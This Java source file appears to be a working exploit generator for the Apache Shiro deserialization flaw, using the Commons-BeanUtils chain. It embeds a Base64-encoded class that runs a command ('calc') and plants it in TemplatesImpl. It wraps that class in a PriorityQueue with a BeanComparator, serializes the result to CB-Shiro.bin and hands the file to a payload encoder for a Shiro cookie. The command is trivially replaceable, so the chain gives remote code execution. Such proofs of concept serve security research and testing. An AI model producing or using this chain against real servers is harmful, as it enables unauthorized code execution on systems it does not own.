package org.example.ShiroAttack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.example.SerUtils;

import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Collections;
import java.util.PriorityQueue;

public class CB_Shiro {
    public static void setFieldValue(Object o, String fieldName, Object newVal) throws Exception {
        Field f = o.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(o,newVal);
    }
    public static void main(String[] args) throws Exception {
        byte[] CalcCode = Base64.getDecoder().decode(
                "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                        "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
                        "TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a" +
                        "W9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKEx" +
                        "jb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hc" +
                        "GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS9" +
                        "4bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAA" +
                        "ygpVgcAGwEAClNvdXJjZUZpbGUBABBUZW1wbGF0ZVBPQy5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGM" +
                        "MAB8AIAEAC1RlbXBsYXRlUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzb" +
                        "HRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnR" +
                        "lcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL" +
                        "2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQA" +
                        "nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIA" +
                        "AIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAA" +
                        "ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA" +
                        "bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl calcTemp = new TemplatesImpl();
        setFieldValue(calcTemp, "_bytecodes", new byte[][]{CalcCode});
        setFieldValue(calcTemp, "_name", "CalcTemplatesImpl");
        setFieldValue(calcTemp, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue<>(2, comparator);
        queue.add("3xsh0re");
        queue.add("CB-1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(comparator, "comparator", Collections.reverseOrder());
        setFieldValue(queue, "queue", new Object[]{calcTemp, calcTemp});

        SerUtils.serialize(queue,"CB-Shiro.bin");
        EncPayload.getPOC("CB-Shiro.bin");
    }
}
